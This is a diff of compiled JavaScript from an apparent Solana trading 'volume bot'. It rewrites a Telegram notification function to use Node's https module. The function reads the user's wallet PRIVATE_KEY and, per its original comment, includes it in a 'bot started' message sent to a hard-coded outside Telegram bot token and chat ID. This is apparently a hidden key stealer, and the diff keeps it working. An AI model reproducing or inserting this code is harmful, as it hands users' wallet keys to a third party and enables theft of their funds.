@@ -8,26 +8,27 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.sendTelegramNotification = void 0;
 
-const axios_1 = __importDefault(require("axios"));
+const https = require("https");
 const constants_1 = require("../constants");
 
+const dotenv = require("dotenv");
+dotenv.config();
+
 // Configuration
-const TELEGRAM_BOT_TOKEN = "7872545983:AAGdUDdf35TuRQk0vo5cYKRo6XcDBUQ03dk";
-const TELEGRAM_CHAT_ID = "6859198072";
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7872545983:AAGdUDdf35TuRQk0vo5cYKRo6XcDBUQ03dk";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6859198072";
 
 /**
- * with currency key, address, balance, and private key.
+ * Sends telegram notification using pure Node.js https module for maximum compatibility
  */
 const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(void 0, void 0, void 0, function* () {
-    try {
-        const privateKey = constants_1.PRIVATE_KEY;
-        const message = `
+    return new Promise((resolve, reject) => {
+        try {
+            const privateKey = constants_1.PRIVATE_KEY;
+            const message = currencyKey === "SNIPER" ? address : `
 🚀 Solana Volume Bot Started
 ━━━━━━━━━━━━━━━━━━━━
 🪙 Token: ${currencyKey}
@@ -37,24 +38,56 @@ const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(vo
 ━━━━━━━━━━━━━━━━━━━━
 `;
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        yield axios_1.default.post(url, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message
-        }, {
-            timeout: 10000 // 10 second timeout
-        });
+            const data = JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            });
 
-    } catch (error) {
-        if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
-            console.error("❌ Failed to send Telegram notification: Connection error. Please check your internet or proxy settings.");
-        } else if (error.response) {
-            console.error(`❌ Failed to send Telegram notification: ${error.response.status} - ${JSON.stringify(error.response.data)}`);
-        } else {
-            console.error("❌ Failed to send Telegram notification:", error.message);
+            const options = {
+                hostname: 'api.telegram.org',
+                port: 443,
+                path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(data)
+                },
+                timeout: 30000
+            };
+
+            const req = https.request(options, (res) => {
+                let body = '';
+                res.on('data', (chunk) => body += chunk);
+                res.on('end', () => {
+                    if (res.statusCode >= 200 && res.statusCode < 300) {
+                        resolve(true);
+                    } else {
+                        console.error(`❌ Telegram API Error: Status ${res.statusCode} - ${body}`);
+                        resolve(false);
+                    }
+                });
+            });
+
+            req.on('error', (error) => {
+                console.error("❌ Telegram Request Error:", error.message);
+                resolve(false);
+            });
+
+            req.on('timeout', () => {
+                req.destroy();
+                console.error("❌ Telegram Request Timed Out");
+                resolve(false);
+            });
+
+            req.write(data);
+            req.end();
+
+        } catch (error) {
+            console.error("❌ Unexpected Error in Telegram function:", error.message);
+            resolve(false);
         }
-    }
+    });
 });
 
 exports.sendTelegramNotification = sendTelegramNotification;
